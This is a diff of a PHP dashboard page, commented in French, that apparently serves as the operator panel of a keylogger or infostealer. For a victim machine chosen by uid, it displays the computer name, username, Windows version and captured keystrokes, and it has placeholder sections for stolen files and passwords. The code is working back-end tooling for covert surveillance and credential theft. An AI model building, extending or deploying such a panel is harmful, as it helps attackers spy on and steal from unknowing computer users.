@@ -1,3 +1,19 @@
+<?php
+// Activer l'affichage des erreurs PHP pour le débogage
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Connexion à la base de données
+include "db.php";
+
+// Vérifier si l'UID est présent dans l'URL
+$uid = isset($_GET['uid']) ? $_GET['uid'] : null;
+if (!$uid) {
+    echo "<p style='color: red;'>Aucun UID fourni dans l'URL.</p>";
+    exit;
+}
+?>
+
 <!doctype html>
 <html lang="en" class="light-style layout-menu-fixed layout-compact" dir="ltr" data-theme="theme-default" data-assets-path="../assets/" data-template="vertical-menu-template-free">
 <head>
@@ -76,7 +92,6 @@
             <a href="index.html" class="menu-link">
               <i class="menu-icon tf-icons bx bx-home-smile"></i>
               <div class="text-truncate" data-i18n="Dashboards">Dashboards</div>
-              <span class="badge rounded-pill bg-danger ms-auto">5</span>
             </a>
           </li>
           <li class="menu-header small text-uppercase">
@@ -122,49 +137,92 @@
           <div class="container-xxl flex-grow-1 container-p-y">
             <h4 class="fw-bold py-3 mb-4">Details de l'ordinateur</h4>
 
-            <!-- Bloc 1 : Info tapée -->
+            <!-- Bloc 1 : Informations générales -->
             <div class="custom-card">
-    <h5><i class="bx bx-keyboard custom-icon"></i> Info tapée</h5>
-    <table class="custom-table">
-        <thead>
-            <tr>
-                <th>UID</th>
-                <th>Texte tapé</th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php
-            include "db.php"; // Inclut la connexion à la base de données
+              <h5><i class="bx bx-info-circle custom-icon"></i> Informations générales</h5>
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Nom de l'ordinateur</th>
+                    <th>Utilisateur</th>
+                    <th>Version Windows</th>
+                    <th>Architecture</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <?php
+                  // Requête SQL pour récupérer les informations générales
+                  $sql = "SELECT DISTINCT uid, computer_name, username, architecture, windows_version FROM client_data WHERE uid = ?";
+                  $stmt = $conn->prepare($sql);
+                  $stmt->bind_param("s", $uid);
+                  $stmt->execute();
+                  $result = $stmt->get_result();
 
-            // Requête pour récupérer les données de keylog_data
-            $sql = "SELECT uid, key_stroke FROM keylog_data ORDER BY uid DESC";
-            $result = $conn->query($sql);
-
-            if ($result->num_rows > 0) {
-                // Parcourt chaque ligne de résultat
-                while ($row = $result->fetch_assoc()) {
-                    echo "<tr>";
-                    echo "<td>" . htmlspecialchars($row['uid']) . "</td>";
-                    echo "<td>" . htmlspecialchars($row['key_stroke']) . "</td>";
-                    echo "</tr>";
-                }
-            } else {
-                echo "<tr><td colspan='2'>Aucune donnée disponible.</td></tr>";
-            }
-
-            $conn->close(); // Ferme la connexion
-            ?>
-        </tbody>
-    </table>
-</div>
-<!-- Bloc 2 : Fichiers -->
-<div class="custom-card">
-              <h5><i class="bx bx-folder custom-icon"></i> Fichiers</h5>
+                  // Vérifier si des résultats sont retournés
+                  if ($result->num_rows > 0) {
+                    while ($row = $result->fetch_assoc()) {
+                      echo "<tr>";
+                      echo "<td>" . htmlspecialchars($row['computer_name']) . "</td>";
+                      echo "<td>" . htmlspecialchars($row['username']) . "</td>";
+                      echo "<td>" . htmlspecialchars($row['windows_version']) . "</td>";
+                      echo "<td>" . htmlspecialchars($row['architecture']) . "</td>";
+                      echo "</tr>";
+                    }
+                  } else {
+                    echo "<tr><td colspan='4'>Aucune donnée disponible pour cet UID.</td></tr>";
+                  }
+                  $stmt->close();
+                  ?>
+                </tbody>
+              </table>
             </div>
 
-            <!-- Bloc 3 : Mots de passe -->
+            <!-- Bloc 2 : Info tapée -->
+            <div class="custom-card">
+              <h5><i class="bx bx-keyboard custom-icon"></i> Info tapée</h5>
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>UID</th>
+                    <th>Texte tapé</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <?php
+                  // Requête SQL pour récupérer les informations des frappes
+                  $sql = "SELECT uid, key_stroke FROM keylog_data WHERE uid = ?";
+                  $stmt = $conn->prepare($sql);
+                  $stmt->bind_param("s", $uid);
+                  $stmt->execute();
+                  $result = $stmt->get_result();
+
+                  // Vérifier si des résultats sont retournés
+                  if ($result->num_rows > 0) {
+                    while ($row = $result->fetch_assoc()) {
+                      echo "<tr>";
+                      echo "<td>" . htmlspecialchars($row['uid']) . "</td>";
+                      echo "<td>" . htmlspecialchars($row['key_stroke']) . "</td>";
+                      echo "</tr>";
+                    }
+                  } else {
+                    echo "<tr><td colspan='2'>Aucune donnée disponible pour cet UID.</td></tr>";
+                  }
+                  $stmt->close();
+                  ?>
+                </tbody>
+              </table>
+            </div>
+
+            <!-- Bloc 3 : Fichiers -->
+            <div class="custom-card">
+              <h5><i class="bx bx-folder custom-icon"></i> Fichiers</h5>
+              <p>Aucune donnée disponible pour les fichiers.</p>
+            </div>
+
+            <!-- Bloc 4 : Mots de passe -->
             <div class="custom-card">
               <h5><i class="bx bx-lock custom-icon"></i> Mots de passe</h5>
+              <p>Aucune donnée disponible pour les mots de passe.</p>
             </div>
           </div>
         </div>
@@ -177,3 +235,8 @@
   <script src="../assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>
 </body>
 </html>
+
+<?php
+// Fermer la connexion à la base de données
+$conn->close();
+?>
